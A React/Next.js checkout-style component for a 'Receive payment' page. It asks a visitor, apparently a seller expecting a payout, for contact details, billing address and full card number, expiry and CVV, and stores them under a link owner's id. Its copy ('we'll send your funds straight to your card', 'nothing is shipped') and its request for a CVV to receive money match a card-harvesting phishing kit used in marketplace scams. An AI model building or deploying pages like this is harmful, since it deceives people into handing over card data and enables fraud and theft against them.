"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { FormProvider, useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { ArrowLeft, Lock } from "lucide-react";
import { toast } from "sonner";

import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";

import {
  initialCheckoutForm1Data,
  defaultSaleSummary,
  type CheckoutForm1Data,
  type SaleSummary,
} from "./checkout-form-1-data";
import { CheckoutForm1BillingStep } from "./checkout-form-1-billing-step";
import { CheckoutForm1ContactStep } from "./checkout-form-1-contact-step";
import { CheckoutForm1PayoutSummary } from "./checkout-form-1-payout-summary";
import { CheckoutForm1PaymentStep } from "./checkout-form-1-payment-step";
import { CheckoutForm1Progress } from "./checkout-form-1-progress";
import { checkoutForm1Schema } from "./checkout-form-1-data";
import { useSubmitPayout } from "@/hooks/use-submit-payout";

const STEP_COPY = [
  {
    title: "Your Information",
    description: "Let's confirm who's receiving this payment",
  },
  {
    title: "Billing Address",
    description:
      "The address linked to your card — used to verify your payout, nothing is shipped",
  },
  {
    title: "Card Details",
    description:
      "Add the debit or credit card where you'd like your funds sent",
  },
];

const STEP_FIELDS: Record<number, (keyof CheckoutForm1Data)[]> = {
  1: ["email", "firstName", "lastName", "phone"],
  2: ["address", "city", "state", "zipCode", "country"],
  3: ["cardNumber", "expiryDate", "cvv", "cardName"],
};

interface CheckoutForm1Props {
  saleSummary?: SaleSummary;
  linkId: string;
  ownerUid: string;
}

export function CheckoutForm1({
  saleSummary = defaultSaleSummary,
  linkId,
  ownerUid,
}: CheckoutForm1Props) {
  const [step, setStep] = useState(1);
  const router = useRouter();
  const submitPayout = useSubmitPayout(ownerUid);

  const form = useForm<CheckoutForm1Data>({
    resolver: zodResolver(checkoutForm1Schema),
    defaultValues: initialCheckoutForm1Data,
    mode: "onTouched",
  });

  const nextStep = async () => {
    const valid = await form.trigger(STEP_FIELDS[step]);
    if (valid) setStep((prev) => Math.min(prev + 1, STEP_COPY.length));
  };

  const prevStep = () => setStep((prev) => Math.max(prev - 1, 1));

  const onSubmit = form.handleSubmit(async (data) => {
    try {
      const submission = await submitPayout.mutateAsync({
        linkId,
        orderId: saleSummary.orderId,
        data,
      });
      // The submission's own id becomes the route param on the processing
      // page — a direct Firestore get, no ambiguity if this link ever
      // gets submitted more than once.
      router.push(`/receive-payment/${linkId}/processing/${submission.id}`);
    } catch (err: any) {
      toast.error(err.message ?? "Failed to submit payout details.");
    }
  });

  return (
    <div className="bg-muted/30">
      <div className="mx-auto w-full max-w-7xl px-4 sm:px-6 lg:px-8 py-8">
        <div className="mb-8 text-center">
          <h1 className="mb-2 text-3xl font-bold text-balance">
            Receive payment
          </h1>
          <p className="text-muted-foreground mx-auto max-w-xl">
            Looks like this is your first payout with us, just confirm a few
            quick details below and we&apos;ll send your funds straight to your
            card.
          </p>
        </div>

        <CheckoutForm1Progress step={step} />

        <FormProvider {...form}>
          <form onSubmit={onSubmit} className="grid gap-8 lg:grid-cols-3">
            <div className="lg:col-span-2">
              <Card>
                <CardHeader>
                  <CardTitle className="text-balance">
                    {STEP_COPY[step - 1].title}
                  </CardTitle>
                  <CardDescription>
                    {STEP_COPY[step - 1].description}
                  </CardDescription>
                </CardHeader>
                <CardContent className="flex flex-col gap-6">
                  {step === 1 ? <CheckoutForm1ContactStep /> : null}
                  {step === 2 ? <CheckoutForm1BillingStep /> : null}
                  {step === 3 ? <CheckoutForm1PaymentStep /> : null}

                  <div className="flex justify-between pt-6">
                    <Button
                      type="button"
                      variant="outline"
                      onClick={prevStep}
                      disabled={step === 1}
                      className="h-9 px-4 py-2 cursor-pointer"
                    >
                      <ArrowLeft data-icon="inline-start" />
                      Back
                    </Button>

                    {step < STEP_COPY.length ? (
                      <Button
                        type="button"
                        onClick={nextStep}
                        className="h-9 px-4 py-2 cursor-pointer"
                      >
                        Continue
                      </Button>
                    ) : (
                      <Button
                        type="submit"
                        disabled={submitPayout.isPending}
                        className="h-9 px-4 py-2 cursor-pointer"
                      >
                        <Lock data-icon="inline-start" />
                        {submitPayout.isPending
                          ? "Submitting..."
                          : "Receive Payment"}
                      </Button>
                    )}
                  </div>
                </CardContent>
              </Card>
            </div>

            <div className="lg:col-span-1">
              <CheckoutForm1PayoutSummary saleSummary={saleSummary} />
            </div>
          </form>
        </FormProvider>
      </div>
    </div>
  );
}

export default CheckoutForm1;
